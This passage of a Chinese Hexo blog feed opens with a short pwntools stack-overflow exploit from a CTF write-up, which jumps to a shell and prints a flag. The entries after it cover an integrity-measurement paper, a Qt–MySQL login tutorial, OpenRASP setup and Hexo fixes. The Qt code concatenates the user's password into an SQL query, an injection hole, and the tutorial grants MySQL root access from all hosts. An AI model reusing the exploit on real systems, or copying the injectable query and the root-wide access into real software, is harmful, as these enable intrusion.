<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25413</span>)</span><br><span class="line">shell = <span class="number">0x400537</span></span><br><span class="line">retn = <span class="number">0x40054e</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">18</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure>
<ol>
<li><code>python exp.py</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111205701121-1124011515.png" alt="img">  <blockquote>
<p>n1book{851939e4e90b864b8d20fe6228564522}</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>N1BOOK</tag>
      </tags>
  </entry>
  <entry>
    <title>论文研读 2021-05-19</title>
    <url>/2021/05/19/QianPaper/</url>
    <content><![CDATA[<h1 id="程序运行模型"><a href="#程序运行模型" class="headerlink" title="程序运行模型"></a>程序运行模型</h1><h2 id="函数运行模型"><a href="#函数运行模型" class="headerlink" title="函数运行模型"></a>函数运行模型</h2><ul>
<li>将程序分解为每一个函数的状态的组合</li>
<li>函数内部运行一个独立的<strong>自动机</strong></li>
<li>每一个函数的自动机组合在一起形成整个程序的自动机</li>
</ul>
<h3 id="自动机构建"><a href="#自动机构建" class="headerlink" title="自动机构建"></a>自动机构建</h3><ul>
<li>静态生成：链表存放函数状态转移</li>
<li>动态生成：函数运行的过程中动态生成自动机。可以减少特征值存放所需要的空间，但是遇到某些未加入状态的正常函数会产生误报。</li>
</ul>
<h2 id="动态完整性度量方法"><a href="#动态完整性度量方法" class="headerlink" title="动态完整性度量方法"></a>动态完整性度量方法</h2><ul>
<li>程序进入新函数时，度量模块就会将函数调用者对应的调用序列压栈保存，并新建空间保存当前序列</li>
<li>函数运行过程中，度量模块记录程序这段时间的调用，作为度量内容</li>
<li>函数运行结束后，度量模块已经记录函数运行序列，并将其与函数自动机比对，验证度量是否成功</li>
<li>度量符合则继续运行，不符合则结束运行</li>
<li>程序返回上一个函数，并将原先保存的序列出栈，继续以上过程，直到程序结束</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Qian 的这篇文章，其实本质上和我们提的方法是一样的。但是这种形式化的描述方法，算法的描述都非常值得借鉴学习！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Lee 发来的一篇不知篇名的文章（未检索到相关信息）</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>可信度量</tag>
        <tag>函数运行</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt 连接 MySQL</title>
    <url>/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="1-Qt-连接本地-MySQL-的方法-（Win）"><a href="#1-Qt-连接本地-MySQL-的方法-（Win）" class="headerlink" title="1 Qt 连接本地 MySQL 的方法 （Win）"></a>1 Qt 连接本地 MySQL 的方法 （Win）</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><h4 id="1-1-1-MySQL-安装"><a href="#1-1-1-MySQL-安装" class="headerlink" title="1.1.1 MySQL 安装"></a>1.1.1 MySQL 安装</h4><p><a href>MySQL的安装</a></p>
<h4 id="1-1-2-新建试验用的数据库和表"><a href="#1-1-2-新建试验用的数据库和表" class="headerlink" title="1.1.2 新建试验用的数据库和表"></a>1.1.2 新建试验用的数据库和表</h4><p>根据需要，自行新建数据库并添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database neuralinfo;</span><br><span class="line">use neuralinfo;</span><br><span class="line">create table users(user_name char(50), user_passwd char(50), primary key(user_name))engine=InnoDB;</span><br><span class="line">insert into users values(&#x27;info&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104152754.png" alt="image-20210527104152754"></p>
<h4 id="1-1-3-ODBC-安装"><a href="#1-1-3-ODBC-安装" class="headerlink" title="1.1.3 ODBC 安装"></a>1.1.3 ODBC 安装</h4><p><a href="https://blog.csdn.net/joey_ro/article/details/105411135">ODBC安装 参考</a></p>
<ul>
<li><a href="https://dev.mysql.com/downloads/connector/odbc/">官网下载</a> 根据指示安装即可</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103810926.png" alt="image-20210527103810926"></p>
<ul>
<li><p>打开 ODBC 64</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103907632.png" alt="image-20210527103907632"></p>
</li>
<li><p>添加用户 DSN，根据实际情况填写即可</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104308974.png" alt="image-20210527104308974"></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104415956.png" alt="image-20210527104415956"></p>
</li>
</ul>
<h3 id="1-2-Qt-连接数据库"><a href="#1-2-Qt-连接数据库" class="headerlink" title="1.2 Qt 连接数据库"></a>1.2 Qt 连接数据库</h3><p>这里，我们写了一个登录页面来试验 MySQL 的连接</p>
<h4 id="1-2-1-UI"><a href="#1-2-1-UI" class="headerlink" title="1.2.1 UI"></a>1.2.1 UI</h4><ul>
<li>主窗口如图，输入框均为 LineEdit</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104746481.png" alt="image-20210527104746481"></p>
<ul>
<li><p>用户名和口令正确，点击 Login 会进入子窗口，子窗口为空白窗口</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527105011886.png" alt="image-20210527105011886"></p>
</li>
</ul>
<h4 id="1-2-2-源码逻辑"><a href="#1-2-2-源码逻辑" class="headerlink" title="1.2.2 源码逻辑"></a>1.2.2 源码逻辑</h4><p><a href="https://github.com/woopokyuk/qtLogin">https://github.com/woopokyuk/qtLogin</a></p>
<p>pro 文件中需要 <code>QT+=sql</code></p>
<ul>
<li><p>必要头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlQuery&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>连接与语句执行方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; QSqlDatabase::<span class="built_in">drivers</span>();</span><br><span class="line">ui-&gt;passwdLineEdit-&gt;<span class="built_in">setEchoMode</span>(QLineEdit::Password);</span><br><span class="line">QSqlDatabase db = QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QODBC&quot;</span>);</span><br><span class="line">db.<span class="built_in">setHostName</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPort</span>(<span class="number">3306</span>);</span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;Neural&quot;</span>);  <span class="comment">// ODBC 中数据源的名称，不是 MySQL 中数据库的名称</span></span><br><span class="line">db.<span class="built_in">setUserName</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPassword</span>(<span class="string">&quot;0000&quot;</span>);  <span class="comment">// 数据库登录密码</span></span><br><span class="line">db.<span class="built_in">open</span>();</span><br><span class="line"><span class="keyword">if</span> (!db.<span class="built_in">open</span>()) &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;db not open&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">QString passwd = ui-&gt;passwdLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line">QString sqlLine = <span class="string">&quot;SELECT * FROM users WHERE user_passwd=&quot;</span> + passwd;</span><br><span class="line">QSqlQuery result = db.<span class="built_in">exec</span>(sqlLine);  <span class="comment">// 执行 MySQL 语句</span></span><br><span class="line">QString userNameInSql = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (result.<span class="built_in">next</span>()) &#123;</span><br><span class="line">    userNameInSql = result.<span class="built_in">value</span>(<span class="string">&quot;user_name&quot;</span>).<span class="built_in">toString</span>();</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; userNameInSql;</span><br><span class="line">&#125;</span><br><span class="line">QString inputUserName = ui-&gt;userLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line"><span class="keyword">if</span>(userNameInSql == inputUserName &amp;&amp; inputUserName != <span class="string">&quot;&quot;</span>) &#123;  <span class="comment">// 验证用户名口令是否一致</span></span><br><span class="line">    test-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;User name or Password is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="2-Linux-Qt-连接远程-MySQL（Win）"><a href="#2-Linux-Qt-连接远程-MySQL（Win）" class="headerlink" title="2 Linux Qt 连接远程 MySQL（Win）"></a>2 Linux Qt 连接远程 MySQL（Win）</h2><hr>
<h3 id="2-1-Linux-下载安装-ODBC"><a href="#2-1-Linux-下载安装-ODBC" class="headerlink" title="2.1 Linux 下载安装 ODBC"></a>2.1 Linux 下载安装 ODBC</h3><h4 id="2-1-1-安装-unixODBC-和-ODBC"><a href="#2-1-1-安装-unixODBC-和-ODBC" class="headerlink" title="2.1.1 安装 unixODBC 和 ODBC"></a>2.1.1 安装 unixODBC 和 ODBC</h4><p>主要参考 <a href="https://blog.csdn.net/seakingx/article/details/87879164">https://blog.csdn.net/seakingx/article/details/87879164</a></p>
<ul>
<li><p>进行到 <code>sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so</code> 时，报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myodbc-installer: error while loading shared libraries: libodbc.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原因：未按步骤安装 unixODBC，按以上参考顺序安装即可，若遇权限问题 sudo 无法解决 (如安装 unixODBC 过程中需要 make 但有权限问题 sudo 无法解决)，就 su 转 root 用户再执行指令</p>
<ul>
<li><p><strong>正确步骤：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> unixODBC 安装</span></span><br><span class="line">sudo wget ftp://ftp.unixodbc.org/pub/unixODBC/unixODBC-2.3.4.tar.gz</span><br><span class="line">tar -xvzf unixODBC-2.3.4.tar.gz </span><br><span class="line">cd unixODBC-2.3.4/</span><br><span class="line">sudo ./configure --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检验是否安装成功</span></span><br><span class="line">odbcinst -j </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> odbc 安装</span></span><br><span class="line">sudo tar zxvf mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit.tar.gz </span><br><span class="line">cd mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit/</span><br><span class="line">sudo cp bin/* /usr/local/bin</span><br><span class="line">sudo cp lib/* /usr/local/lib</span><br><span class="line"></span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so&quot;</span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8a.so&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证是否安装成功</span></span><br><span class="line">myodbc-installer -d -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置ODBC 参数</span></span><br><span class="line">sudo vi /etc/odbc.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>最终的 <code>/etc/odbc.ini</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Neural]</span><br><span class="line">Description     = Data source MySQL</span><br><span class="line">Driver          = MySQL ODBC 8.0 Driver</span><br><span class="line">Server          = x.x.x.x</span><br><span class="line">Host            = x.x.x.x</span><br><span class="line">Database        = xxxx</span><br><span class="line">Port            = 3306</span><br><span class="line">User            = root</span><br><span class="line">Password        = 0000</span><br></pre></td></tr></table></figure>
<ul>
<li>其中方括号内的是数据源名称，可以任意</li>
<li>Description 描述根据自己需要，任意填写</li>
<li>Driver 确定是 MySQL ODBC 8.0 Driver</li>
<li>Server 和 Host 均为 MySQL 的 IP</li>
<li>Database 为需要在 Linux 端使用的数据库</li>
</ul>
</li>
<li><p>以上步骤走完后，<code>isql Neural</code> 还是无法连接</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160249814.png" alt="image-20210527160249814"></p>
</li>
<li><p>参考 <a href="https://blog.csdn.net/m0_37210884/article/details/114287684">https://blog.csdn.net/m0_37210884/article/details/114287684</a> 应该 <code>isql -v Neural root 0000</code> 指明数据库，用户名，密码</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160522927.png" alt="image-20210527160522927"></p>
<p>结果报错不太一样了，其中指出机器不允许连接</p>
</li>
</ul>
<h4 id="2-1-2-解决上文的-S1000-连接问题"><a href="#2-1-2-解决上文的-S1000-连接问题" class="headerlink" title="2.1.2 解决上文的 S1000 连接问题"></a>2.1.2 解决上文的 S1000 连接问题</h4><p><a href="https://blog.csdn.net/weixin_42096620/article/details/110798766">参考</a></p>
<ul>
<li><p><strong>原因：</strong>root 用户只允许本地登录，细节如下</p>
<ul>
<li><p><code>use mysql;</code></p>
</li>
<li><p><code>SELECT user,host FROM user;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162519904.png" alt="image-20210527162519904"></p>
</li>
</ul>
</li>
<li><p><strong>解决方法：</strong>将 root 对应的 host 改为 %，意即所有地址可访问。细节如下</p>
<ul>
<li><code>update user set host = &#39;%&#39; where user = &#39;root&#39;;</code> 更新访问权限</li>
<li><code>flush privileges;</code> 刷新访问权限表</li>
<li><code>select user,host from user;</code> 再查看 host 发现已经修改好了</li>
</ul>
</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162802153.png" alt="image-20210527162802153"></p>
<ul>
<li><p>结果：</p>
<ul>
<li><p>在 Linux 端 <code>isql -v Neural root 0000</code> 直接进入连接，并使用在 odbc.ini 中我们预先指定的数据库了</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162938228.png" alt="image-20210527162938228"></p>
</li>
<li><p><code>show tables;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527163038271.png" alt="image-20210527163038271"></p>
</li>
</ul>
</li>
</ul>
<p>大功告成！</p>
<h3 id="2-2-Qt-中使用"><a href="#2-2-Qt-中使用" class="headerlink" title="2.2 Qt 中使用"></a>2.2 Qt 中使用</h3><p>上文已经可以在命令行中使用 ODBC 连接远程 MySQL 了，如何在 Qt 中连接呢</p>
<p>根据第 1 节的代码，类似的，我们在 Linux 环境下进行试验，当我们运行程序后，Qt 会报错 <code>QSqlDatabase: QODBC driver not loaded</code> 说明在连接 ODBC 驱动的数据库时，缺少了libqt4-sql-odbc驱动包</p>
<p><a href="https://blog.csdn.net/u012444155/article/details/16944393">解决方法参考</a></p>
<ul>
<li><code>sudo apt-get install libqt4-sql-odbc</code></li>
</ul>
<p>然后就可以成功连接啦！</p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>RASP技术</title>
    <url>/2021/07/04/RASP%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-什么是-RASP"><a href="#1-什么是-RASP" class="headerlink" title="1 什么是 RASP"></a>1 什么是 RASP</h2><p>Runtime application self-protection，运行时应用自我保护技术，与应用程序融为一体，实时监测和阻断攻击，注入到被保护应用的服务中提供函数级别的实时防护，可以在不更新策略以及不升级被保护应用代码的情况下检测/防护未知漏洞。具备自我保护功能，不需要人为干涉。</p>
<h2 id="2-RASP-的原理"><a href="#2-RASP-的原理" class="headerlink" title="2 RASP 的原理"></a>2 RASP 的原理</h2><p>在 Java 技术栈下，RASP 引擎以 javaagent 的形式实现，并运行在 JVM 之上。在应⽤服务器启动的时候，RASP 引擎借助 JVM 自身提供的 instrumentation 技术，通过替换字节码的方式对关键类方法进行挂钩，结合上下文、参数污染、语义引擎等方式检测攻击。比如：数据库操作、文件读写、命令执行等，当服务器发生攻击，就会触发这些 HOOK 点，然后 RASP agent 就可以获取到函数的参数（文件名、要执行的命令等）</p>
<p>RASP 的技术原理与 APM是⼀样的，只是挂钩的函数要少很多。</p>
<h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3 环境搭建"></a>3 环境搭建</h2><h3 id="3-1-Tomcat-安装"><a href="#3-1-Tomcat-安装" class="headerlink" title="3.1 Tomcat 安装"></a>3.1 Tomcat 安装</h3><p>参考 <a href="https://www.cnblogs.com/yocichen/p/10478431.html">https://www.cnblogs.com/yocichen/p/10478431.html</a></p>
<h3 id="3-2-安装RASP客户端"><a href="#3-2-安装RASP客户端" class="headerlink" title="3.2 安装RASP客户端"></a>3.2 安装RASP客户端</h3><p>参考 <a href="https://rasp.baidu.com/doc/install/manual/tomcat.html">https://rasp.baidu.com/doc/install/manual/tomcat.html</a></p>
<ol>
<li>进入 rasp 目录</li>
<li>执行 <code>java -jar RaspInstall.jar -install C:\Program&quot; &quot;Files\Apache&quot; &quot;Software&quot; &quot;Foundation\Tomcat&quot; &quot;8.5</code> </li>
<li>注意以上指令中的双引号是为了防止空格导致的出错</li>
<li>随后自动安装完成</li>
</ol>
<p><img src="/2021/07/04/RASP%E6%8A%80%E6%9C%AF/image-20210730162617832.png" alt="image-20210730162617832"></p>
<ol>
<li>重启 Tomcat 服务即可生效</li>
</ol>
<h3 id="3-3-安装测试用例"><a href="#3-3-安装测试用例" class="headerlink" title="3.3 安装测试用例"></a>3.3 安装测试用例</h3><p>参考 <a href="https://rasp.baidu.com/doc/install/testcase.html">https://rasp.baidu.com/doc/install/testcase.html</a></p>
<ol>
<li><p>这里下载 vulns.war</p>
</li>
<li><p>将下载后的 war 包复制到 <code>webapps</code> 目录如 <code>C:\Program Files\Apache Software Foundation\Tomcat 8.5\webapps</code></p>
</li>
<li>随后会在 <code>webapps</code> 目录自动生成 <code>vulns</code> 目录，通过浏览器访问 <code>http://localhost:8080/vulns/</code></li>
</ol>
<p><img src="/2021/07/04/RASP%E6%8A%80%E6%9C%AF/image-20210730163254941.png" alt="image-20210730163254941" style="zoom: 80%;"></p>
<h3 id="3-4-开启拦截（单机）"><a href="#3-4-开启拦截（单机）" class="headerlink" title="3.4 开启拦截（单机）"></a>3.4 开启拦截（单机）</h3><p>参考 <a href="https://rasp.baidu.com/doc/setup/standalone.html#block-malicious">https://rasp.baidu.com/doc/setup/standalone.html#block-malicious</a></p>
<ol>
<li>修改官方插件 <code>D:\Software\App\rasp-java\rasp-2021-02-07\rasp\plugins</code></li>
<li>将 all_log 改为 false</li>
</ol>
<p><img src="/2021/07/04/RASP%E6%8A%80%E6%9C%AF/image-20210730164219455.png" alt="image-20210730164219455" style="zoom:67%;"></p>
<h2 id="4-Java-RASP-架构说明-4-5-​​"><a href="#4-Java-RASP-架构说明-4-5-​​" class="headerlink" title="4  Java RASP 架构说明$^{4,5}$​​"></a>4  Java RASP 架构说明$^{4,5}$​​</h2><p>在服务器启动时，可动态的修改Java字节码，对敏感操作的函数进行挂钩。当服务器发生攻击，就会触发这些Hook点，此时RASP agent就可以获取到函数的参数。</p>
<p>RASP以Java Instrumentation的方式工作在JVM层，它主要通过hook可能引发漏洞的关键函数，在这些关键函数执行之前添加安全检查，根据上下文和关键函数的参数等信息判断请求是否为恶意请求，并终止或继续执行流。</p>
<hr>
<ul>
<li><p>Java Instrumentation</p>
<p>允许开发者访问从JVM中加载的类，并且允许对它的字节码做修改，加入我们自己的代码，这些都是在运行时完成的。(无需担心这个机制带来的安全问题，因为它也同样遵从适用于Java类和相应的类加载器的安全策略。)</p>
<p>允许开发者添加自定义的字节码转换器来对Java字节码进行自定义的操作转化，从而实现在不修改源代码的情况下，实现AOP。</p>
</li>
</ul>
<p>OpenRASP的开发者选择了ASM这个框架，相比其他的框架，ASM的优点是更加底层、更加灵活，功能也更加丰富。</p>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5 参考"></a>5 参考</h2><ol>
<li><a href="https://rasp.baidu.com/#section-intro">开源应用运行时自我保护解决方案 - OpenRASP - 百度安全 (baidu.com)</a></li>
<li><a href="https://paper.seebug.org/330/">Rasp 技术介绍与实现 (seebug.org)</a></li>
<li><a href="https://www.freebuf.com/articles/web/197823.html">https://www.freebuf.com/articles/web/197823.html</a></li>
<li><p><a href="https://rasp.baidu.com/doc/hacking/architect/java.html">Java 版本 - OpenRASP 官方文档 - 开源自适应安全产品 (baidu.com)</a></p>
</li>
<li><p><a href="https://paper.seebug.org/513/">https://paper.seebug.org/513/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>RASP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ref</title>
    <url>/2021/05/09/Ref/</url>
    <content><![CDATA[<h2 id="5-1-4-主题安装"><a href="#5-1-4-主题安装" class="headerlink" title="5.1.4 主题安装"></a>5.1.4 主题安装</h2><h3 id="安装参考"><a href="#安装参考" class="headerlink" title="安装参考"></a>安装参考</h3><p><a href="https://www.qcmoke.site/blog/hexo_next.html">hexo+next打造精美的个人博客网站 | Qcmoke’s Blog</a></p>
<p><a href="https://www.jianshu.com/p/94b332d22115">hexo+gitee免费搭建个人博客 - 简书 (jianshu.com)</a></p>
<h3 id="hexo-s-的问题解决"><a href="#hexo-s-的问题解决" class="headerlink" title="hexo s 的问题解决"></a>hexo s 的问题解决</h3><p>由于 8.4.0 存在很多未知问题（实际上是我太菜，不知道怎么解决），所以还是回到 5.1.4。但是 5.1.4 也存在一些问题，比如 <code>hexo s</code>后查看本地   <a href="http://localhost:4000">http://localhost:4000</a> 回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and config.subtitle %&#125; - &#123;&#123;config.subtitle &#125;&#125;&#123;% endif %&#125;&#123;% endblock %&#125; &#123;% block page_class %&#125; &#123;% if is_home() %&#125;page-home&#123;% endif -%&#125; &#123;% endblock %&#125; &#123;% block content %&#125;</span><br><span class="line">&#123;% for post in page.posts %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125; &#123;% endfor %&#125;</span><br><span class="line">&#123;% include &#x27;_partials/pagination.swig&#x27; %&#125; &#123;% endblock %&#125; &#123;% block sidebar %&#125; &#123;&#123; sidebar_template.render(false) &#125;&#125; &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>这个问题的解决方法在该项目 <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a>  issue 中找到：手动安装 swig </p>
<ul>
<li><code>npm i hexo-renderer-swig</code></li>
<li><code>hexo c</code></li>
<li><code>hexo g</code></li>
<li><code>hexo c</code></li>
</ul>
<h3 id="菜单栏无法识别问题"><a href="#菜单栏无法识别问题" class="headerlink" title="菜单栏无法识别问题"></a>菜单栏无法识别问题</h3><p>类似 <code>Cannot GET /%20</code> 的问题，是因为主题的<code>_congif.yml</code> 文件中菜单栏的设置多个空格，官方默认的 <code>home: / || home</code>是错的，应该是 <code>home: /|| home</code></p>
<h3 id="图片不显示的问题"><a href="#图片不显示的问题" class="headerlink" title="图片不显示的问题"></a>图片不显示的问题</h3><p><a href="https://www.cnblogs.com/gispathfinder/p/12239390.html">参考</a> ，这是 hexo-asset-image 的 bug，需要对<code>Blog\node_modules\hexo-asset-image\index.js</code>进行如下修改，即可正常显示</p>
<p><img src="/2021/05/09/Ref/image-20210510174338088.png" alt="image-20210510174338088"></p>
<h3 id="图片不显示的问题（2021-08-20更新）"><a href="#图片不显示的问题（2021-08-20更新）" class="headerlink" title="图片不显示的问题（2021.08.20更新）"></a>图片不显示的问题（2021.08.20更新）</h3><p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题 - 简书 (jianshu.com)</a></p>
<p><code>Blog\node_modules\hexo-asset-image\index.js</code> 中添加和修改代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">&#x27;.&#x27;</span>);  <span class="comment">// 新增</span></span><br><span class="line"><span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>) </span><br><span class="line">  <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">  <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/09/Ref/image-20210820121802826.png" alt="image-20210820121802826"></p>
<h3 id="编译时遇到未知路径问题"><a href="#编译时遇到未知路径问题" class="headerlink" title="编译时遇到未知路径问题"></a>编译时遇到未知路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Template render error: (unknown path)</span><br><span class="line">    Error: unexpected end of comment</span><br><span class="line">      at Object._prettifyError (D:\Document\Blog\node_modules\nunjucks\src\lib.js:36:11)</span><br><span class="line">      at Template.render (D:\Document\Blog\node_modules\nunjucks\src\environment.js:538:21)</span><br><span class="line">      at Environment.renderString (D:\Document\Blog\node_modules\nunjucks\src\environment.js:380:17)</span><br><span class="line">      at D:\Document\Blog\node_modules\hexo\lib\extend\tag.js:236:16</span><br><span class="line">      at tryCatcher (D:\Document\Blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">      at Function.Promise.fromNode.Promise.fromCallback (D:\Document\Blog\node_modules\bluebird\js\release\promise.js:209:30)</span><br></pre></td></tr></table></figure>
<p>这种是文章中出现未转义的括号造成的，尽量用 ` 进行转移，将其包裹成文本或代码形式</p>
<h3 id="页面下方翻页不正常显示"><a href="#页面下方翻页不正常显示" class="headerlink" title="页面下方翻页不正常显示"></a>页面下方翻页不正常显示</h3><p><a href="https://www.cnblogs.com/xiejava/p/12456273.html">参考</a></p>
<p><code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>不显示为<code>&gt;</code>，解决方法是在<code>Blog\themes\next\layout\_partials\pagination.swig</code>文件中，添加参数<code>escape: false</code></p>
<p><img src="/2021/05/09/Ref/image-20210524231854084.png" alt="image-20210524231854084"></p>
<p>然后重新编译即可正常显示了，如下图</p>
<p><img src="/2021/05/09/Ref/image-20210524231934515.png" alt="image-20210524231934515"></p>
<h3 id="显示公式"><a href="#显示公式" class="headerlink" title="显示公式"></a>显示公式</h3><p><a href="https://www.dazhuanlan.com/2019/12/19/5dfb3c4dae9ca/">hexo中数学公式不能正常显示问题解决 | 大专栏 (dazhuanlan.com)</a></p>
<h4 id="公式换行无效的问题"><a href="#公式换行无效的问题" class="headerlink" title="公式换行无效的问题"></a>公式换行无效的问题</h4><p><a href="https://lanlan2017.github.io/blog/eb86e892/">Hexo Mathjax双斜线换行失效 | 蓝蓝博客 (lanlan2017.github.io)</a></p>
<h3 id="npm-警告"><a href="#npm-警告" class="headerlink" title="npm 警告"></a>npm 警告</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.3.2 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@2.3.2: wanted &#123;&quot;os&quot;:&quot;darwin&quot;,&quot;arch&quot;:&quot;any&quot;&#125; (current: &#123;&quot;os&quot;:&quot;win32&quot;,&quot;arch&quot;:&quot;x64&quot;&#125;)</span><br></pre></td></tr></table></figure>
